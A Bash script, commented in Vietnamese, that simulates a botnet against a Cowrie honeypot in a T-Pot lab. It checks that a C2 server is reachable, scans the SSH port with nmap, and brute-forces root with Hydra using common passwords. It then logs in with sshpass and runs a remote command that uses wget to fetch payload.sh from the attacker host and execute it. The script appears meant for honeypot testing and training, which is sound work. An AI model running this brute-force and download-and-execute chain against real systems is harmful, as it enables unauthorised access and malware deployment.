#!/usr/bin/env bash
# ============================================
# Mô phỏng botnet cho Cowrie (T-Pot) - BẢN ỔN ĐỊNH (chỉ dùng wget)
# Dùng trong LAB/HONEYPOT hợp pháp (VD: T-Pot)
# ============================================

set -euo pipefail

# --------- Tham số & mặc định ----------
TPOT_IP="${1:-}"
KALI_IP="${2:-}"
TPOT_PORT="${3:-${TPOT_PORT:-22}}"

usage() { echo "Usage: $0 <T-POT_IP> <KALI_IP> [TPOT_PORT]"; exit 1; }
[[ -z "${TPOT_IP}" || -z "${KALI_IP}" ]] && usage

# --------- Tiện ích ----------
say()  { printf "%s\n" "$*"; }
need() { command -v "$1" >/dev/null 2>&1 || { say "[!] Thiếu công cụ: $1"; exit 1; }; }

# Chỉ yêu cầu các tool cần thiết (không dùng curl)
for t in nmap hydra sshpass wget awk sed grep; do need "$t"; done

TMPDIR="$(mktemp -d)"
cleanup() { rm -rf "$TMPDIR" 2>/dev/null || true; }
trap cleanup EXIT

# --------- Kiểm tra C2 (chỉ dùng wget) ----------
say "[*] Kiểm tra C2: http://${KALI_IP}:8080/payload.sh ..."
# --spider: kiểm tra tồn tại; -q yên lặng; --timeout 5 giây
if ! wget --spider -q --timeout=5 "http://${KALI_IP}:8080/payload.sh"; then
  say "[!] Không truy cập được payload.sh tại ${KALI_IP}:8080"
  say "    - Trên Kali:  cd ~/c2server && python3 -m http.server 8080"
  say "    - Firewall:   sudo ufw allow 8080/tcp (nếu dùng ufw)"
  exit 2
fi
say "[+] C2 OK."

# --------- Quét cổng ----------
say "[*] Quét cổng SSH ${TPOT_IP}:${TPOT_PORT} ..."
# Không fail nếu nmap trả mã khác 0
nmap -sT -Pn -p "${TPOT_PORT}" "${TPOT_IP}" || true

# --------- Chuẩn bị wordlists ----------
say "[*] Chuẩn bị danh sách user/pass ..."
USERS="${TMPDIR}/users.txt"
PWDS="${TMPDIR}/pass.txt"
printf "root\n" > "${USERS}"
cat > "${PWDS}" <<'EOF'
root
admin
123456
password
EOF

# --------- Brute-force với Hydra ----------
say "[*] Brute-force bằng Hydra ..."
HYDRA_OUT="${TMPDIR}/hydra.out"
hydra -L "${USERS}" -P "${PWDS}" -t 4 -V -f -o "${HYDRA_OUT}" "ssh://${TPOT_IP}" -s "${TPOT_PORT}" || true

# --------- Parse kết quả ----------
USER_FOUND="$(awk '/\[ssh\] host:/ && /login:/ && /password:/ {for(i=1;i<=NF;i++){if($i=="login:"){u=$(i+1)}; if($i=="password:"){p=$(i+1)}}; if(u!="" && p!=""){print u; exit}}' "${HYDRA_OUT}" || true)"
PASS_FOUND="$(awk '/\[ssh\] host:/ && /login:/ && /password:/ {for(i=1;i<=NF;i++){if($i=="login:"){u=$(i+1)}; if($i=="password:"){p=$(i+1)}}; if(u!="" && p!=""){print p; exit}}' "${HYDRA_OUT}" || true)"

if [[ -n "${USER_FOUND}" && -n "${PASS_FOUND}" ]]; then
  USER="${USER_FOUND}"
  PASS="${PASS_FOUND}"
  say "[+] Dùng cred: ${USER} / ${PASS}"
else
  say "[!] Hydra KHÔNG tìm thấy cred → dùng mặc định LAB: root / admin"
  USER="root"
  PASS="admin"
fi

# --------- Chuỗi lệnh từ xa (CHỈ wget, không (), không &&, không ||) ----------
# Dùng -T (no-tty) để Cowrie xử lý ổn định hơn.
# Lệnh dạng hiền: chỉ ;, if, test. Tải về /tmp/payload.sh rồi thực thi.
REMOTE_CMD='sh -c "
cd /tmp;
rm -f payload.sh;
wget -q -O payload.sh http://'${KALI_IP}':8080/payload.sh;
if [ ! -s payload.sh ]; then echo '\''[!] payload.sh rỗng/không tải được'\''; exit 10; fi;
chmod +x payload.sh;
sh payload.sh
"'

# --------- SSH thực thi ----------
say "[*] SSH vào Cowrie & chạy payload (wget) ..."
set +e
sshpass -p "${PASS}" ssh \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  -o PreferredAuthentications=password \
  -o PubkeyAuthentication=no \
  -o ConnectTimeout=8 \
  -o ServerAliveInterval=5 \
  -o ServerAliveCountMax=2 \
  -p "${TPOT_PORT}" \
  -T "${USER}@${TPOT_IP}" "${REMOTE_CMD}"
SSH_RC=$?
set -e

if [[ ${SSH_RC} -ne 0 ]]; then
  say "[!] SSH/Payload lỗi (mã: ${SSH_RC}). Có thể do Cowrie đóng phiên sớm hoặc mạng từ container không ra được KALI_IP:8080."
  say "    Gợi ý: kiểm tra kết nối từ trong container Cowrie:"
  say "           docker exec -it cowrie sh -lc \"wget -qO- http://${KALI_IP}:8080/payload.sh | head\""
  exit 3
fi

say "[+] Hoàn tất mô phỏng botnet."
exit 0
